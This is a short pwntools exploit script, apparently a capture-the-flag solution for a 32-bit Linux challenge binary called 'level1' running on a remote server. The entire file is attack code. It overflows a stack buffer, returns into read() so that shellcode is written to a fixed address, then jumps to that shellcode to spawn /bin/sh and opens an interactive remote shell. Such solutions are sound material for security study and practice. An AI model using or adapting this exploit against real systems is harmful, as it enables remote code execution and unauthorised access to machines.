from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('level1')
io = remote('node4.buuoj.cn', 29675)
elf = ELF('level1')
main = elf.symbols['main']
read_plt = elf.plt['read']
buf = 0x804a020

shellcode = asm(shellcraft.sh())
payload = cyclic(0x8c) + p32(read_plt) + p32(buf) + p32(0) + p32(buf) + p32(len(shellcode))
io.sendline(payload)
io.send(shellcode)
io.interactive()

